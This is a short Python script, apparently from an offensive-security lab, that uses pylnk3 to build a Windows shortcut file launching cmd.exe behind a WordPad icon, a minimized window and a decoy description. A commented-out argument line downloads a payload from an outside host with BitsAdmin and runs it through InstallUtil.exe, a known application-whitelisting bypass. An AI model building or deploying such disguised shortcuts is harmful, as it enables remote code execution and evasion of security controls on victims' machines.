#!/bin/env python3
from ak import *
import pylnk3

target = r"C:\\\\Windows\\\\cmd.exe"
name = "test.lnk"
#arguments = "/c BitsAdmin /Transfer myJob http://192.168.49.65/Bypass C:\\Windows\\tasks\\bp && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bp"
arguments = "/c cmd.exe"
description = "foobar"
icon = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
icon_index = 0
workdir = "C:\\Windows\\Tasks\\"
mode = "Minimized"

pylnk3.for_file(
    target, name, arguments=arguments,
    description=description, icon_file=icon,
    icon_index=icon_index, work_dir=workdir, window_mode=mode
)


